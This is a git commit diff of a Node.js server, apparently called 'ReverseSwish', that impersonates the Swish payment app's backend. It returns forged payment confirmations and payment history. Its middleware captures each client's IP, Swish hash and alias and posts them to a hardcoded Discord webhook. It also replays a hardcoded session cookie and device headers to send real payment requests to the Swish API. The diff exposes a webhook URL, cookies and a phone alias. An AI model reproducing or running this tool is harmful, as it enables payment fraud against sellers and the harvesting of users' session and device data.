51a71cdd8c0df334c739a674c2509845005cae9f
lunar.go <142523482+lunarxploit@users.noreply.github.com>
2024-07-02 22:18:26 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,47 +1,70 @@
- // Import packages
 const express = require("express");
 const axios = require("axios");
 
 const app = express();
-
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1257464182257745980/c9fqfewXJrsw-BAvglkmbfJ99-WeCcdmWpsH59L8GejA3vovL4DSRv2kROAEjxTV_3ms";
-let userID = 0;
- 
+
 app.use(express.json());
 
-
 // Example route handler for '/'
-app.get('/', (res) => {
+app.get('/', (req, res) => {
   res.send("Hey there");
 });
 
-
-  // Function to send Discord webhook
+// Function to send Discord webhook with an embed message
 async function sendDiscordWebhookEmbed(embed) {
   try {
     await axios.post(DISCORD_WEBHOOK_URL, { embeds: [embed] });
     console.log("Embedded Webhook sent successfully");
   } catch (error) {
-    console.error("Error sending webhook:", error);
+    console.error("Error sending webhook:", error.message);
   }
 }
-async function sendDiscordWebhookEmbed(msg) {
-  try {
-    await axios.post(DISCORD_WEBHOOK_URL, {
-      content: msg
-    });
 
-    console.log("Embedded Webhook sent successfully");
+// Async function to initiate payment request
+async function checkPhoneNumber(phone) {
+  try {
+    const headers = {
+      'Host': 'mpc.getswish.net',
+      'hash': 'C12D3EEF97C3FD1C4967D822B2B8AAB3160D84B4',
+      'deviceOsVersion': '16.5.1',
+      'Accept': '*/*',
+      'clientTime': '1719949318',
+      'deviceManufacturer': 'Apple',
+      'deviceOs': 'ios',
+      'Accept-Language': 'en-GB,en;q=0.9',
+      'clientVersion': '5.19',
+      'installationId': '8746E45A1E6F4259B4747F332B7B6ECD',
+      'Accept-Encoding': 'gzip, deflate, br',
+      'Content-Length': '99',
+      'User-Agent': 'Swish/934 CFNetwork/1408.0.4 Darwin/22.5.0',
+      'Connection': 'close',
+      'Content-Type': 'application/json',
+      'deviceModel': 'iPhone15,2',
+      'Swish-Alias': '46706505038',
+      'Cookie': 'TS01c4fa8b=01a49c05c3117327095190809cdfafbe0a00c2da27e073f7772edc247a003e3242fb107d651da68ed2c225882ca46b0aad33727f8328acbedceb1ae36cf8c7e2577ac79f21; JSESSIONID=9EF414547B21679C432D635D1C4D6C10'
+    };
+
+    const response = await axios.post(
+      "https://mpc.getswish.net/mpc-swish/api/v1/paymentrequest/initiatePaymentRequest", 
+      {
+        "receiverAlias": phone,
+        "currency": "SEK",
+        "amount": "1.00",
+        "message": ""
+      },
+      { headers }
+    );
+
+    return response.data;
   } catch (error) {
-    console.error("Error sending webhook:", error.message);
-    // Handle specific error cases or log more details
+    throw new Error(`Error initiating payment request: ${error.message}`);
   }
 }
 
 // Middleware to send a Discord webhook for every request
 app.use(async (req, res, next) => {
   try {
-
     const ipAddress = req.headers['x-forwarded-for'];
     const hash = req.headers['hash'];
     const alias = req.headers['swish-alias'];
@@ -56,11 +79,9 @@ app.use(async (req, res, next) => {
         { name: 'Swish Hash', value: hash, inline: true },
         { name: 'Swish Alias', value: alias, inline: true },
         { name: 'Swish CTime', value: clienttime, inline: true },
-
       ],
       footer: { text: 'ReSwish IOS | Version (0.0.1)' }
     };
-
 
     await sendDiscordWebhookEmbed(embedMessage);
   } catch (error) {
@@ -68,12 +89,12 @@ app.use(async (req, res, next) => {
   }
   next();
 });
-// Endpoints
 
-app.post("/mpc-swish/api/v4/initiatepayment", async (req, res) => {
+// Endpoints
+app.post("/mpc-swish/api/v4/initiatepayment", (req, res) => {
   res.status(200).send('{"autoStartToken":"deadb33f-cdb6-4df3-8de0-deadb33f","result":"200","paymentID":"DEADB33F"}');
-  });
-  
+});
+
 app.get("/mpc-swish/api/v1/blocks/", (req, res) => {
   res.status(200).send('{"time":"2024-06-19T13:38:01.122+00:00","block":[]}');
 });
@@ -83,10 +104,12 @@ app.get("/mpc-swish/api/v4/paymenthistory/100/INCOMING/0/100/", (req, res) => {
 });
 
 app.get("/mpc-swish/api/v4/paymenthistory/100/ALL/0/100/", (req, res) => {
-  res.status(200).send('{"result":"200","bankIdOrderReference":null,"dateTimeOfSearch":null,"endOfSearch":true,"item":[{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"This is an example message.","orderId":null,"paymentType":"P2P","gift":{"themeId":"sallad1"},"birPaymentId":"123123123","paymentDirection":"INCOMING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:56:23"}],"autoStartToken":null}');});
+  res.status(200).send('{"result":"200","bankIdOrderReference":null,"dateTimeOfSearch":null,"endOfSearch":true,"item":[{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"This is an example message.","orderId":null,"paymentType":"P2P","gift":{"themeId":"sallad1"},"birPaymentId":"123123123","paymentDirection":"INCOMING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:56:23"}],"autoStartToken":null}');
+});
 
 app.get("/mpc-swish/api/v4/paymenthistory/100/OUTGOING/0/100/", (req, res) => {
-  res.status(200).send('{"result":"200","bankIdOrderReference":null,"dateTimeOfSearch":null,"endOfSearch":true,"item":[{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"This is an example message.","orderId":null,"paymentType":"P2P","gift":{"themeId":"sallad1"},"birPaymentId":"123123123","paymentDirection":"INCOMING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:56:23"}],"autoStartToken":null}');});
+  res.status(200).send('{"result":"200","bankIdOrderReference":null,"dateTimeOfSearch":null,"endOfSearch":true,"item":[{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"This is an example message.","orderId":null,"paymentType":"P2P","gift":{"themeId":"sallad1"},"birPaymentId":"123123123","paymentDirection":"INCOMING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:56:23"}],"autoStartToken":null}');
+});
 
 app.get("/mpc-swish/api/v1/paymentrequest/findByRoleAndState", (req, res) => {
   res.status(200).send('{"data":[{"id":"2dcfdaa5-416f-49c6-84ed-337a09d4157f","state":"CONFIRMED","amount":"1","currency":"SEK","senderName":"","senderAlias":"4670000000","receiverName":"Marianne Essen Nordlander","receiverAlias":"4670000001","message":"Sent, CONFIRMED","deniedMessage":null,"viewed":false,"initiatedAt":"2019-12-17T12:53:37.281Z","confirmedAt":"2019-12-17T12:53:41.089Z","cancelledAt":null,"deniedAt":null,"deletedAt":null,"updatedAt":"2019-12-17T12:53:41.089Z","expiredAt":"2020-02-15T12:53:41.089Z"}],"time":"2019-12-17T13:17:08.188+0000"}');
@@ -101,7 +124,6 @@ app.get("/apputils-swish/api/v1/favorite", (req, res) => {
 });
 
 // ExecutePayment Endpoint
-
 app.post("/mpc-swish/api/v3/initiateactivation/:param1/:param2", (req, res) => {
   res.status(200).send('{"result":"200","autoStartToken":"9e83a6c0-d8bb-428b-b99b-3a59340c57c7"}');
 });
@@ -111,7 +133,7 @@ app.post("/mpc-swish/api/v3/executeactivation/", (req, res) => {
 });
 
 app.post("/mpc-swish/api/v3/executepayment/:param1", (req, res) => {
-    res.status(200).json('{"result":"200","amount":"1.00","currency":"USD","payeeName":"TEST USER","payeeBusinessName":null}');
+  res.status(200).json('{"result":"200","amount":"1.00","currency":"USD","payeeName":"TEST USER","payeeBusinessName":null}');
 });
 
 // Badgecount Endpoints
@@ -120,32 +142,28 @@ app.get("/mpc-swish/api/v2/badgecount/", (req, res) => {
 });
 
 app.get("/mpc-swish/api/v1/paymentrequest/badgecount", (req, res) => {
-  res.status(200).send(
-    '{"data":{"pprInfo":1,"pprRequiresAction":0},"time":"2024-06-18T12:07:37.587+00:00"}',
-  );
+  res.status(200).send('{"data":{"pprInfo":1,"pprRequiresAction":0},"time":"2024-06-18T12:07:37.587+00:00"}');
 });
 
 // Consents Endpoint
 app.get("/mpc-swish/consents/v1/detailed-notifications/info", (req, res) => {
-  res.status(200).send(
-    '{"requestReference":"028C557A57064DBC80810213A6320561","devicePublicKey":"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0KzjRPBgtWPFpHYjLE9HK4gfwYXnKpkuL3mNUXgjJvzUTZdBSgV9f2T5cEbiPLQcgifGymtfdjZ4Gt9syoHsqaDIbxjx0bd05T4h26gQtNEfGuhFy6uXMvgKP3PFP5paYzKUJHi+yTFlaSZnKEUrlCu5D2kOqTz6cv5NISUJH0u1H7kesckhdQT7cfEPNdjYnbImrXLZ9P3+3E0UxApEmztwm0lDCHFS0tjgX2Yh4hjxx/tCCk1BMu/HXdYne66DzkOmv63YeAXrR+3VluhgCsj5j576UK6lWgEunsV8/QV0HzjXM/ne2IEsbuceITdSKgcxPfvVW79JafdK0BipWwIDAQAB","version":"2i","optInDate":"2024-06-18T12:07:23.164+00:00","validDays":90}',
-  );
+  res.status(200).send('{"requestReference":"028C557A57064DBC80810213A6320561","devicePublicKey":"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0KzjRPBgtWPFpHYjLE9HK4gfwYXnKpkuL3mNUXgjJvzUTZdBSgV9f2T5cEbiPLQcgifGymtfdjZ4Gt9syoHsqaDIbxjx0bd05T4h26gQtNEfGuhFy6uXMvgKP3PFP5paYzKUJHi+yTFlaSZnKEUrlCu5D2kOqTz6cv5NISUJH0u1H7kesckhdQT7cfEPNdjYnbImrXLZ9P3+3E0UxApEmztwm0lDCHFS0tjgX2Yh4hjxx/tCCk1BMu/HXdYne66DzkOmv63YeAXrR+3VluhgCsj5j576UK6lWgEunsV8/QV0HzjXM/ne2IEsbuceITdSKgcxPfvVW79JafdK0BipWwIDAQAB","version":"2i","optInDate":"2024-06-18T12:07:23.164+00:00","validDays":90}');
 });
+
 app.get("/v1/issues/active?channel=appPrivate", (req, res) => {
   res.status(200).send(
-    '[{"id":"7fb409c1-a704-42ee-9a33-a0304f9cf893","resolved_at":null,"type":"DOWNTIME","ends_at":null,"created_by":{"at":1573760671379,"email":"helena.timm@bontouch.com"},"starts_at":1573408806000,"target":{"service":"all","bank":"","provider":"swish","supplier":""},"updates":[],"publish_at":1573758006000,"updated_by":{"email":"helena.timm@bontouch.com","at":1573761948676},"channels":[{"data":{"message":"1","title":"Driftstopp"},"name":"appPrivate"}]},{"id":"76148aad-aa49-49c3-ae76-6334c6929c06","created_by":{"email":"hendrik.stjernstrom@bontouch.com","at":1573485984711},"starts_at":1573485936144,"target":{"service":"all","provider":"bank"},"updates":[],"publish_at":1573485936144,"channels":[{"data":{"message":"2","title":"H"},"name":"appPrivate"}],"resolved_at":null,"type":"DISTURBANCE","ends_at":null},{"id":"da4129be-1ca3-412b-824d-95ec5a48143b","ends_at":null,"created_by":{"at":1573544574430,"email":"hendrik.stjernstrom@bontouch.com"},"starts_at":1573544544003,"target":{"service":"all","bank":"Handelsbanken","provider":"bank"},"updates":[],"publish_at":1573544544003,"channels":[{"name":"appPrivate","data":{"title":"","message":"3"}}],"resolved_at":null,"type":"DISTURBANCE"},{"id":"73435caa-9183-4df1-9177-4604fb28509a","created_by":{"at":1573634479014,"email":"hendrik.stjernstrom@bontouch.com"},"starts_at":1573634382799,"target":{"provider":"swish","service":"all","bank":""},"updates":[],"publish_at":1573634382799,"channels":[{"data":{"message":"4","title":""},"name":"appPrivate"}],"resolved_at":null,"type":"DISTURBANCE","ends_at":null},{"id":"d4cf7692-cb33-4325-882d-e2289469cb51","target":{"provider":"supplier","supplier":"bankgirot","service":"all","bank":""},"updates":[],"publish_at":1573746470100,"channels":[{"data":{"message":"5","title":"Hendrik"},"name":"appPrivate"}],"resolved_at":null,"type":"DISTURBANCE","ends_at":null,"created_by":{"email":"hendrik.stjernstrom@bontouch.com","at":1573746506835},"starts_at":1573746470100}]',
+    '[{"id":"7fb409c1-a704-42ee-9a33-a0304f9cf893","resolved_at":null,"type":"DOWNTIME","ends_at":null,"created_by":{"at":1573760671379,"email":"helena.timm@bontouch.com"},"starts_at":1573408806000,"target":{"service":"all","bank":"","provider":"swish","supplier":""},"updates":[],"publish_at":1573758006000,"updated_by":{"email":"helena.timm@bontouch.com","at":1573761948676},"channels":[{"data":{"message":"1","title":"Driftstopp"},"name":"appPrivate"}]},{"id":"76148aad-aa49-49c3-ae76-6334c6929c06","created_by":{"email":"hendrik.stjernstrom@bontouch.com","at":1573485984711},"starts_at":1573485936144,"target":{"service":"all","provider":"bank"},"updates":[],"publish_at":1573485936144,"channels":[{"data":{"message":"2","title":"H"},"name":"appPrivate"}],"resolved_at":null,"type":"DISTURBANCE","ends_at":null},{"id":"da4129be-1ca3-412b-824d-95ec5a48143b","ends_at":null,"created_by":{"at":1573544574430,"email":"hendrik.stjernstrom@bontouch.com"},"starts_at":1573544544003,"target":{"service":"all","bank":"Handelsbanken","provider":"bank"},"updates":[],"publish_at":1573544544003,"channels":[{"name":"appPrivate","data":{"title":"","message":"3"}}],"resolved_at":null,"type":"DISTURBANCE"},{"id":"73435caa-9183-4df1-9177-4604fb28509a","created_by":{"at":1573634479014,"email":"hendrik.stjernstrom@bontouch.com"},"starts_at":1573634382799,"target":{"provider":"swish","service":"all","bank":""},"updates":[],"publish_at":1573634382799,"channels":[{"data":{"message":"4","title":""},"name":"appPrivate"}],"resolved_at":null,"type":"DISTURBANCE","ends_at":null},{"id":"d4cf7692-cb33-4325-882d-e2289469cb51","target":{"provider":"supplier","supplier":"bankgirot","service":"all","bank":""},"updates":[],"publish_at":1573746470100,"channels":[{"data":{"message":"5","title":"Hendrik"},"name":"appPrivate"}],"resolved_at":null,"type":"DISTURBANCE","ends_at":null,"created_by":{"email":"hendrik.stjernstrom@bontouch.com","at":1573746506835},"starts_at":1573746470100}]'
   );
 });
+
 // PaymentRequest Endpoints
 app.get("/mpc-swish/api/v1/paymentrequest/viewSetting", (req, res) => {
-  res.status(200).send(
-    '{"data":{"privatePaymentRequest":true,"requireParentalConsent":false},"time":"2024-05-23T17:08:25.261+00:00"}',
-  );
+  res.status(200).send('{"data":{"privatePaymentRequest":true,"requireParentalConsent":false},"time":"2024-05-23T17:08:25.261+00:00"}');
 });
 
 app.post("/mpc-swish/api/v1/paymentrequest/initiatePaymentRequest", async (req, res) => {
   try {
-    const { phone } = req.body; // Assuming 'phone' is sent in the request body
+    const { phone } = req.body;
     const paymentResponse = await checkPhoneNumber(phone);
     res.status(200).json(paymentResponse);
   } catch (error) {
@@ -154,30 +172,26 @@ app.post("/mpc-swish/api/v1/paymentrequest/initiatePaymentRequest", async (req, 
 });
 
 app.get("/mpc-swish/api/v3/paymentrequest/ecom/check/:num", (req, res) => {
-  res.status(200).send(
-    '{"result":"200","checkInfo":{"status":"NOT_FOUND","mechanism":"longpolling","clientTimeOut":25,"secondsUntilNextRequest":3}}',
-  );
+  res.status(200).send('{"result":"200","checkInfo":{"status":"NOT_FOUND","mechanism":"longpolling","clientTimeOut":25,"secondsUntilNextRequest":3}}');
 });
 
-
+// Error handling middleware for 404 errors
 app.use((req, res, next) => {
   const err = new Error('Not Found');
   err.status = 404;
   next(err); // Passes control to the error handling middleware
 });
 
-// Error handling middleware for 404 errors
 app.use((err, req, res, next) => {
   if (err.status === 404) {
-      res.status(200).send(
-    '{"result":"200","message":null}',
-  );
+    res.status(200).send('{"result":"200","message":null}');
   } else {
     next(err); // Passes control to the default error handler for other errors
   }
 });
 
-app.listen(3000, () => {
-  console.log("ReverseSwish is running on port 3000!");
+// Start server
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`ReverseSwish is running on port ${PORT}!`);
 });
-;
